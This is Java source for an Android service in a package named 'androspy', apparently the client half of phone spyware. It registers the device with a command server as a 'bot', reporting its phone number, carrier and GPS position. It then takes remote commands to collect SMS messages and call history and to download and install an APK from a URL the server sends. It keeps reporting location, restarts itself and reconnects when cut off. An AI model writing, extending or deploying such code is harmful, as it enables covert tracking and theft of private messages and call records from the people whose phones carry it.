package buddy.ap.com.androspy;

import android.Manifest;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.os.Bundle;
import android.os.IBinder;
import android.support.v4.app.ActivityCompat;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.net.URISyntaxException;
import java.util.HashMap;

import http.Http;
import io.socket.client.Ack;
import io.socket.client.IO;
import io.socket.client.Socket;
import io.socket.emitter.Emitter;


public class Client extends Service {

    private static final String TAG = "Client";

    private static final String POST_STATUS = "/status";

    private CommonParams params;
    private Client client;
    private Socket socket;
    private boolean connected;
    private boolean registered;
    private double latitude;
    private double longitude;

    public Socket getSocket() {
        return socket;
    }

    public double getLatitude() {
        return latitude;
    }

    public double getLongitude() {
        return longitude;
    }

    private final LocationListener locationListener = new LocationListener() {
        public void onLocationChanged(Location location) {
            updateLocation(location);
        }

        public void onProviderDisabled(String provider) {
            updateLocation(null);
        }

        public void onProviderEnabled(String provider) {
        }

        public void onStatusChanged(String provider, int status, Bundle extras) {
        }
    };

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onCreate() {

        params = new CommonParams(this);
        client = this;
        connected = false;

        latitude = 0;
        longitude = 0;

        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
            LocationManager locManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
            locManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, 400, 1, locationListener);
            Location location = locManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
            if (location != null) {
                latitude = location.getLatitude();
                longitude = location.getLongitude();
                Log.i(TAG, "Location Is Live = (" + latitude + "," + longitude + ")");
            }
        }
        try {
            socket = IO.socket(params.getServer());
            socket.on(Socket.EVENT_CONNECT, new Emitter.Listener() {

                @Override
                public void call(Object... args) {

                    Log.i(TAG, "\n\nSocket connected\n\n");
                    connected = true;

                    HashMap bot = new HashMap();
                    bot.put("uid", params.getUid());
                    bot.put("provider", params.getProvider());
                    bot.put("lat", latitude);
                    bot.put("longi", longitude);
                    bot.put("device", params.getDevice());
                    bot.put("sdk", params.getSdk());
                    bot.put("version", params.getVersion());
                    bot.put("phone", params.getPhone());

                    JSONObject obj = new JSONObject(bot);
                    socket.emit("register", obj, new Ack() {
                        @Override
                        public void call(Object... args) {
                            registered = true;
                            Log.i(TAG, "Socket connected");
                        }
                    });

                }

            });

            socket.on("commands", new Emitter.Listener() {

                @Override
                public void call(Object... args) {
                    JSONArray cmds = (JSONArray) args[0];
                    for (int i = 0; i < cmds.length(); i++) {
                        JSONObject cmd = new JSONObject();
                        try {
                            cmd = (JSONObject) cmds.get(i);

                            String command = (String) cmd.get("command");
                            Log.i(TAG, "\nCommand: " + cmd.toString() + "\n");

                            if (command.equals("getsms")) {
                                Log.i(TAG, "\nInvoking Sms Service\n");
                                int arg1 = Integer.parseInt(cmd.get("arg1").toString());
                                SmsService smsService = new SmsService(client, arg1);
                                smsService.start();
                            } else if (command.equals("getcallhistory")) {
                                Log.i(TAG, "\nInvoking Call LOg Service\n");
                                int arg1 = Integer.parseInt(cmd.get("arg1").toString());
                                CallLogService cs = new CallLogService(client, arg1);
                                cs.start();
                            } else if (command.equals("promptupdate")) {
                                Log.i(TAG, "\nInvoking UpdateApp\n");
                                String apkUrl = cmd.get("arg1").toString();

                                UpdateApp atualizaApp = new UpdateApp(apkUrl);
                                atualizaApp.setContext(client);
                                atualizaApp.run();
                            }

                        } catch (JSONException e) {
                            e.printStackTrace();
                        }
                    }
                }

            });

            socket.on(Socket.EVENT_DISCONNECT, new Emitter.Listener() {

                @Override
                public void call(Object... args) {
                    connected = false;
                    Log.i(TAG, "\n\nSocket disconnected...\n\n");
                    final Thread reconnect = new Thread(new Runnable() {
                        @Override
                        public void run() {
                            Log.i(TAG, "Socket reconnecting...");
                            try {
                                Thread.sleep(5000);
                            } catch (InterruptedException e) {
                                e.printStackTrace();
                            }
                            if (!connected)
                                socket.connect();
                        }
                    });

                    reconnect.start();
                }

            });

        } catch (URISyntaxException e) {
            e.printStackTrace();
        }

        super.onCreate();

    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.i(TAG, "Running onStartCommand");

//        socket.connect();

        Log.i(TAG, "\n\n\nSocket is " + (connected ? "connected" : "not connected\n\n\n"));
        if (!connected) {
            Log.i(TAG, "Socket is connecting ......\n");
            socket.connect();
        }

        super.onStartCommand(intent, flags, startId);
        return START_STICKY;

    }

    private void updateLocation(Location location) {
        if (location != null) {
            latitude = location.getLatitude();
            longitude = location.getLongitude();

            Log.i(TAG, "Location changed ....");

            HashMap bot = new HashMap();
            bot.put("uid", params.getUid());
            bot.put("provider", params.getProvider());
            bot.put("lat", latitude);
            bot.put("longi", longitude);
            bot.put("device", params.getDevice());
            bot.put("sdk", params.getSdk());
            bot.put("version", params.getServer());
            bot.put("phone", params.getPhone());
            Http req = new Http();
            req.setUrl(params.getServer() + POST_STATUS + "/" + params.getUid());
            req.setMethod("POST");
            req.setParams(bot);
            req.execute();
        }
    }

}
